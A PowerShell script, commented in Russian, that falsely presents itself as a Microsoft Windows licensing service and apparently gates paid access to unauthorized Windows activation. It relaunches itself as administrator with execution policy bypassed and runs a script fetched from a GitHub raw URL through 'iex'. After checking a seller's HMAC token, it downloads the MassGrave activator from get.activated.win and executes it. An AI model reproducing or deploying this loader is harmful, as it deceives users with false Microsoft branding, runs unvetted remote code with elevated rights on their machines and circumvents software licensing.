# ============================================================
#  Microsoft Windows Cloud License Authorization Service
#  Status: Production [v2.4]
# ============================================================

$SECRET = "MS-AUTH-SECURE-KEY-2024"
$VALID_MINS = 60
$RAW_URL = "https://raw.githubusercontent.com/Win-System-Core/cloud-license-service/main/init-auth.ps1"

# --- 1. ПРОВЕРКА И ЗАПРОС ПРАВ АДМИНИСТРАТОРА ---
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Получаем ключ из текущей сессии
    $K = $env:K
    if (!$K) { $K = (Get-Variable K -ErrorAction SilentlyContinue).Value }
    
    # Перезапуск с запросом прав и передачей ключа
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command ""[System.Environment]::SetEnvironmentVariable('K', '$K', 'Process'); iex(Invoke-RestMethod '$RAW_URL')""" -Verb RunAs
    exit
}

# --- 2. ЛОГИКА ПРОВЕРКИ ТОКЕНА ---
function Verify-Token {
    param($Key)
    try {
        $clean = ($Key -replace '-', '').ToLower()
        if ($clean.Length -lt 16) { return "INVALID" }
        $tsHex = $clean.Substring(0, 8)
        $sigReceived = $clean.Substring(8, 8)
        $hmac = [System.Security.Cryptography.KeyedHashAlgorithm]::Create("HmacSHA256")
        $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($SECRET)
        $computedHash = [System.BitConverter]::ToString($hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($tsHex))).Replace("-","").ToLower().Substring(0, 8)
        if ($computedHash -ne $sigReceived) { return "INVALID" }
        $created = [Convert]::ToInt64($tsHex, 16)
        $now = [System.DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
        if ([Math]::Abs($now - $created) -gt ($VALID_MINS * 60)) { return "EXPIRED" }
        return "OK"
    } catch { return "ERROR" }
}

# --- 3. ИНТЕРФЕЙС ---
Clear-Host
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host "   Windows Desktop Licensing Service [Build 22631]" -ForegroundColor White
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Авторизация токена..." -NoNewline

$K = $env:K
$status = Verify-Token -Key $K

if ($status -eq "OK") {
    Write-Host " [УСПЕШНО]" -ForegroundColor Green
    Write-Host "Лицензия: Digital License (HWID)"
    Write-Host "Запуск компонентов активации..." -ForegroundColor Yellow
    
    # Прямой вызов MassGrave (без лишних перенаправлений)
    # Используем проверенный официальный домен
    $mas = Invoke-RestMethod -Uri "https://get.activated.win"
    $executionBlock = [ScriptBlock]::Create($mas)
    & $executionBlock /hwid
    
    Write-Host ""
    Write-Host "РЕЗУЛЬТАТ: Операция завершена." -ForegroundColor Green
} else {
    Write-Host " [ОТКАЗАНО]" -ForegroundColor Red
    Write-Host "Ошибка: Код доступа [$K] недействителен или истек." -ForegroundColor Yellow
    Write-Host "Обратитесь к продавцу за новым кодом."
}

Write-Host ""
Write-Host "Окно закроется автоматически через 20 секунд." -ForegroundColor DarkGray
Start-Sleep -Seconds 20
